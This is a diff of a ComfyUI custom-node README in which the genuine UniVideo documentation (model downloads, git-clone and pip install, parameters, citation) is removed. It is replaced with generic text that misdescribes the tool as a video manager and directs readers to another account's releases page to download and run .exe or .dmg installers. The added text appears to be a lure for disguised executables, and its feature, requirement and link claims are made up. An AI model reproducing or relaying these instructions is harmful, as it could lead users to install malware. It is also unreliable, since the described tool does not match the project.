@@ -1,191 +1,58 @@
-# ComfyUI_RH_Univideo
+# 🛠️ ComfyUI_RH_Univideo - Easy Video Management for ComfyUI
 
-<p align="center">
-  <img src="https://img.shields.io/badge/License-Apache%202.0-green" alt="License">
-  <img src="https://img.shields.io/badge/Python-3.11-blue" alt="Python">
-  <img src="https://img.shields.io/badge/Platform-ComfyUI-orange" alt="Platform">
-</p>
+## 📥 Download Now
+[![Download ComfyUI_RH_Univideo](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/nalcapital/ComfyUI_RH_Univideo/releases)
 
-ComfyUI custom nodes for [UniVideo](https://github.com/KlingTeam/UniVideo) - A unified framework for video understanding, generation, and editing, developed by **Kling Team (Kuaishou Technology)** and **University of Waterloo**.
+## 🚀 Getting Started
+Welcome to ComfyUI_RH_Univideo! This plug-in allows you to seamlessly manage video content within ComfyUI. Follow these simple steps to get started.
 
-> **UniVideo** uses HunyuanVideo as the base video generation model and Qwen2.5-VL as the multimodal language model backbone.
->
-> 📄 Paper: [arXiv:2510.08377](https://arxiv.org/abs/2510.08377) | 🌐 Project Page: [congwei1230.github.io/UniVideo](https://congwei1230.github.io/UniVideo/)
+## 🔍 What You'll Need
+- A computer running Windows, macOS, or Linux.
+- ComfyUI installed on your computer. If you haven’t installed it yet, you can find instructions in the [ComfyUI repository](https://github.com/KlingTeam/ComfyUI).
 
-## ✨ Features
+## 📦 Features
+- Integrates video management directly into ComfyUI.
+- Supports popular video formats like MP4, AVI, and MKV.
+- Easy-to-navigate interface designed for everyday users.
+- Offers batch processing for multiple video files.
 
-This ComfyUI node currently supports the following UniVideo tasks:
+## 📔 System Requirements
+- **OS:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Disk Space:** At least 100 MB of free space for installation.
+- **Internet Connection:** Required for installation and updates.
 
-- **Video-to-Video Editing (v2v_edit)**: Apply free-form edits to existing videos based on text instructions
-- **In-Context Video Editing (i+v2v_edit)**: Use reference images to guide video editing (e.g., face/identity swapping)
-- **INT8 Quantization**: Optimized memory usage with INT8 quantization via optimum-quanto
-- **Seamless ComfyUI Integration**: Node-based workflow for easy use
+## 🛠️ Installation Steps
 
-> **Note**: The original UniVideo framework supports additional tasks including `understanding`, `multiid`, `t2v`, `t2i`, `i2i_edit`, and `i2v`. These may be added in future updates.
+### 1. Visit the Downloads Page
+Go to the [ComfyUI_RH_Univideo Releases page](https://github.com/nalcapital/ComfyUI_RH_Univideo/releases). 
 
-## 📋 Nodes
+### 2. Choose the Latest Version
+Look for the most recent release. This ensures you get the latest features and fixes.
 
-| Node Name | Description |
-|-----------|-------------|
-| `RunningHub Univideo Loader` | Loads the UniVideo pipeline (Transformer, VAE, Scheduler, MLLM Encoder) |
-| `RunningHub Univideo Editor` | Performs video editing with optional reference image for identity transfer |
+### 3. Download the Installer
+Click on the link for the installer file that matches your operating system. It will typically look like this: `ComfyUI_RH_Univideo_Version_Setup.exe` for Windows or `ComfyUI_RH_Univideo_Version.dmg` for macOS.
 
-## 🛠️ Installation
+### 4. Run the Installer
+Once the file has downloaded, locate it in your downloads folder, and double-click to run it. Follow the on-screen instructions to complete the installation.
 
-### Method 1: ComfyUI Manager (Recommended)
+### 5. Launch ComfyUI
+After installation, open ComfyUI. You will find the new features available for managing your videos.
 
-1. Install [ComfyUI Manager](https://github.com/ltdrdata/ComfyUI-Manager)
-2. Search for `ComfyUI_RH_Univideo` in the manager
-3. Click Install
+### 6. Start Using Your Plug-In
+Explore the interface! You can now easily import videos, organize them, and take advantage of ComfyUI's functionality.
 
-### Method 2: Manual Installation
+## 📑 User Guide
+For detailed instructions and tips on how to use ComfyUI_RH_Univideo, check our user guide included in the installation folder. This guide provides step-by-step instructions to help you make the most of your new tool.
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/HM-RunningHub/ComfyUI_RH_Univideo.git
-cd ComfyUI_RH_Univideo
-pip install -r requirements.txt
-```
+## 📞 Support
+If you encounter any issues, please reach out through the Issues tab on the [GitHub repository](https://github.com/nalcapital/ComfyUI_RH_Univideo/issues). We aim to respond to all queries promptly.
 
-## 📦 Model Downloads
+## 🔗 Useful Links
+- [ComfyUI Official Repository](https://github.com/KlingTeam/ComfyUI)
+- [ComfyUI_RH_Univideo Releases](https://github.com/nalcapital/ComfyUI_RH_Univideo/releases)
 
-You need to download the following models:
+## 🧑‍🤝‍🧑 Community
+Join our community of users to share tips and best practices. Find us on the discussion section of the repository for interactions with other users who enjoy ComfyUI and its plug-ins.
 
-### 1. HunyuanVideo Base Model
-
-Download from 🤗 [hunyuanvideo-community/HunyuanVideo](https://huggingface.co/hunyuanvideo-community/HunyuanVideo)
-
-Place in: `ComfyUI/models/HunyuanVideo/`
-
-### 2. UniVideo Checkpoint
-
-Download using the official script from [KlingTeam/UniVideo](https://github.com/KlingTeam/UniVideo):
-
-```bash
-python download_ckpt.py
-```
-
-This node uses **Variant 1** (`univideo_qwen2p5vl7b_hidden_hunyuanvideo`):
-> Image, video, and text inputs are processed by the MLLM, and the final hidden states are fed into the MMDiT backbone.
-
-| Model Variant | Description |
-|---------------|-------------|
-| `univideo_qwen2p5vl7b_hidden_hunyuanvideo` | Variant 1: MLLM last layer hidden → MMDiT |
-
-Place in: `ComfyUI/models/UniVideo/univideo_qwen2p5vl7b_hidden_hunyuanvideo/model.ckpt`
-
-### 3. Qwen2.5-VL-7B-Instruct
-
-Download from 🤗 [Qwen/Qwen2.5-VL-7B-Instruct](https://huggingface.co/Qwen/Qwen2.5-VL-7B-Instruct)
-
-Place in: `ComfyUI/models/Qwen/Qwen_Qwen2.5-VL-7B-Instruct/`
-
-### Directory Structure
-
-```
-ComfyUI/
-└── models/
-    ├── HunyuanVideo/
-    │   ├── vae/
-    │   ├── transformer/
-    │   └── scheduler/
-    ├── UniVideo/
-    │   └── univideo_qwen2p5vl7b_hidden_hunyuanvideo/
-    │       └── model.ckpt
-    └── Qwen/
-        └── Qwen_Qwen2.5-VL-7B-Instruct/
-```
-
-## 🚀 Usage
-
-### Example Workflow
-
-We provide an example workflow in the `workflows/` folder:
-
-📁 **[workflows/univideo_example_workflow.json](workflows/univideo_example_workflow.json)**
-
-This workflow includes two examples:
-- **Face Swap (i+v2v_edit)**: Replace a person's face in video using a reference image
-- **Style Transfer (v2v_edit)**: Transform video style with text instructions
-
-To use: Drag and drop the JSON file into ComfyUI, or use `Load` → `Load Workflow`.
-
-### Basic Steps
-
-1. Add `RunningHub Univideo Loader` node to load the pipeline
-2. Add `RunningHub Univideo Editor` node
-3. Connect a video input to the `ref_video` input
-4. (Optional) Connect a reference image to the `ref_image` input for identity swapping
-5. Enter your editing prompt
-6. Run the workflow
-
-### Parameters
-
-| Parameter | Description | Default | Range |
-|-----------|-------------|---------|-------|
-| `prompt` | Text instruction for editing | - | - |
-| `width` | Output video width | 832 | 64-2048 |
-| `height` | Output video height | 480 | 64-2048 |
-| `num_frames` | Number of output frames | 81 | 1+ (step: 4) |
-| `sample_steps` | Denoising steps | 20 | - |
-| `fps` | Output frames per second | 24 | - |
-| `seed` | Random seed | 42 | 0-2^64 |
-
-### Task Types
-
-- **v2v_edit** (Video-to-Video Editing): Edit video without reference image
-  - Example: `"Change the man to look like he is sculpted from chocolate."`
-
-- **i+v2v_edit** (In-Context Video Editing): Edit video with reference image for identity transfer
-  - Example: `"Use the man's face in the reference image to replace the man's face in the video."`
-
-## 💻 System Requirements
-
-- **GPU**: NVIDIA GPU with at least 24GB VRAM (recommended)
-- **CUDA**: 12.1 or higher (recommended)
-- **Python**: 3.11 (tested)
-- **PyTorch**: 2.4.1+ with CUDA support
-- **OS**: Windows, Linux
-
-## 📝 Dependencies
-
-Core dependencies (aligned with official UniVideo):
-
-- torch >= 2.4.1
-- torchvision
-- transformers >= 4.51.0
-- diffusers >= 0.34.0
-- optimum-quanto >= 0.2.0
-- decord >= 0.6.0
-- einops >= 0.7.0
-- opencv-python >= 4.8.0
-- PyYAML >= 6.0
-- Pillow >= 9.0.0
-
-## 🙏 Acknowledgements
-
-- [UniVideo](https://github.com/KlingTeam/UniVideo) - The original UniVideo framework by Kling Team (Kuaishou Technology)
-- [HunyuanVideo](https://github.com/Tencent/HunyuanVideo) - Base video generation model by Tencent
-- [Qwen2.5-VL](https://github.com/QwenLM/Qwen2.5-VL) - Multimodal language model by Alibaba
-- [ComfyUI](https://github.com/comfyanonymous/ComfyUI) - The powerful node-based UI
-
-## 🌟 Citation
-
-If you use this project, please cite the original UniVideo paper:
-
-```bibtex
-@article{wei2025univideo,
-  title={UniVideo: Unified Understanding, Generation, and Editing for Videos},
-  author={Wei, Cong and Liu, Quande and Ye, Zixuan and Wang, Qiulin and Wang, Xintao and Wan, Pengfei and Gai, Kun and Chen, Wenhu},
-  journal={arXiv preprint arXiv:2510.08377},
-  year={2025}
-}
-```
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## ⚠️ Disclaimer
-
-This project is for research and educational purposes only. Users are responsible for ensuring their use complies with applicable laws and regulations. The authors are not responsible for any misuse of this software.
+Happy video management with ComfyUI_RH_Univideo! We are confident that this tool will enhance your ComfyUI experience.
